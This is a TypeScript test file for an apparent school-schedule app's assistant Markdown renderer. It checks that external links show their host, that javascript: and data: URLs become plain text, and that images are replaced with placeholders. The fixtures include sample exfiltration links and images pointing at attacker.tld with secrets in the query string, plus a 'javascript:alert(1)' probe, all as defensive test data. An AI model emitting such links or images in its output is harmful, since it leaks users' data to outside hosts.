import { test } from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "@/components/assistant/markdown";
import { imagePlaceholder, linkView } from "./links";

const ORIGIN = "https://raspison.vercel.app";

test("linkView: внешняя ссылка со спрятанным адресом получает хост рядом с текстом", () => {
  assert.deepEqual(linkView("https://attacker.tld/x?d=секрет", "Полное задание (PDF)", ORIGIN), {
    kind: "external",
    href: "https://attacker.tld/x?d=%D1%81%D0%B5%D0%BA%D1%80%D0%B5%D1%82",
    label: "attacker.tld",
  });
  // На сервере origin неизвестен — внешняя всё равно внешняя.
  assert.equal(linkView("https://attacker.tld/", "Задание", null).kind, "external");
});

test("linkView: текст уже называет хост — приписка не нужна; похожий хост — нужна", () => {
  const auto = linkView("https://attacker.tld/x?d=1", "https://attacker.tld/x?d=1", ORIGIN);
  assert.equal(auto.kind === "external" && auto.label, null, "автоссылка GFM показывает адрес целиком");
  const www = linkView("http://www.example.com", "www.example.com", ORIGIN);
  assert.equal(www.kind === "external" && www.label, null);
  const bare = linkView("https://Attacker.TLD/path", "attacker.tld", ORIGIN);
  assert.equal(bare.kind === "external" && bare.label, null, "регистр не важен");
  const lookalike = linkView("https://attacker.tld/", "attacker.tld.raspison.ru", ORIGIN);
  assert.equal(lookalike.kind === "external" && lookalike.label, "attacker.tld", "хост в тексте должен кончаться границей адреса");
  const other = linkView("https://attacker.tld/", "raspison.vercel.app/hw", ORIGIN);
  assert.equal(other.kind === "external" && other.label, "attacker.tld");
});

test("linkView: IDN-хост показывается в punycode — подмену буквы видно", () => {
  const v = linkView("https://расписание.рф/", "Расписание", ORIGIN);
  assert.equal(v.kind, "external");
  assert.ok(v.kind === "external" && v.label?.startsWith("xn--"));
});

test("linkView: свой origin, относительный адрес и якорь — внутренние, как есть", () => {
  assert.deepEqual(linkView("/group/homework?d=2026-09-25", "Домашка", ORIGIN), { kind: "internal", href: "/group/homework?d=2026-09-25" });
  assert.deepEqual(linkView(`${ORIGIN}/schedule#today`, "Расписание", ORIGIN), { kind: "internal", href: "/schedule#today" });
  assert.deepEqual(linkView("#user-content-fn-1", "1", ORIGIN), { kind: "internal", href: "#user-content-fn-1" }, "якорь сноски не уводит на главную");
  assert.deepEqual(linkView("hw/new", "новая", ORIGIN), { kind: "internal", href: "hw/new" });
  // На сервере относительный — всё равно внутренний.
  assert.deepEqual(linkView("/group", "Группа", null), { kind: "internal", href: "/group" });
  // Протокол-относительный адрес — чужой хост, а не наш путь.
  assert.equal(linkView("//attacker.tld/x", "Задание", ORIGIN).kind, "external");
});

test("linkView: почта и телефон — с адресатом; пустые и чужие схемы — просто текст", () => {
  const mail = linkView("mailto:x@attacker.tld?body=беседа", "старосте", ORIGIN);
  assert.equal(mail.kind === "external" && mail.label, "письмо: x@attacker.tld");
  const mailShown = linkView("mailto:x@attacker.tld", "x@attacker.tld", ORIGIN);
  assert.equal(mailShown.kind === "external" && mailShown.label, null);
  const tel = linkView("tel:+79000000000", "позвонить", ORIGIN);
  assert.equal(tel.kind === "external" && tel.label, "звонок: +79000000000");
  // defaultUrlTransform превращает javascript: и data: в пустую строку.
  assert.deepEqual(linkView("", "клик", ORIGIN), { kind: "text" });
  assert.deepEqual(linkView(undefined, "клик", ORIGIN), { kind: "text" });
  assert.deepEqual(linkView("javascript:alert(1)", "клик", ORIGIN), { kind: "text" });
  assert.deepEqual(linkView("data:text/html,x", "клик", ORIGIN), { kind: "text" });
});

test("imagePlaceholder: подпись вместо картинки", () => {
  assert.equal(imagePlaceholder("схема"), "[картинка: схема]");
  assert.equal(imagePlaceholder(""), "[картинка]");
  assert.equal(imagePlaceholder(undefined), "[картинка]");
});

test("Markdown: ни одного <img>, внешняя ссылка с хостом, сырой HTML — текстом", () => {
  const md = [
    "Вот задание ![схема](https://attacker.tld/p.png?d=секрет) и ещё ![](https://attacker.tld/q.png).",
    "",
    "[Полное задание (PDF)](https://attacker.tld/x?d=пересказ) · [домашка](/hw) · https://example.com/a",
    "",
    '<img src="https://attacker.tld/raw.png">',
  ].join("\n");
  const html = renderToStaticMarkup(createElement(Markdown, { text: md }));
  assert.ok(!/<img/i.test(html), `в разметке есть <img>: ${html}`);
  assert.ok(html.includes("[картинка: схема]"));
  assert.ok(html.includes("[картинка]"));
  assert.match(html, /Полное задание \(PDF\)<\/span><span[^>]*> \(attacker\.tld\)<\/span><\/a>/);
  assert.match(html, /rel="noopener noreferrer nofollow"/);
  assert.match(html, /<a href="\/hw"[^>]*>домашка<\/a>/, "свой путь — без приписки и без rel");
  assert.ok(!html.includes("(example.com)"), "автоссылка и так показывает адрес");
  assert.ok(html.includes("&lt;img"), "сырой HTML показан текстом");
});
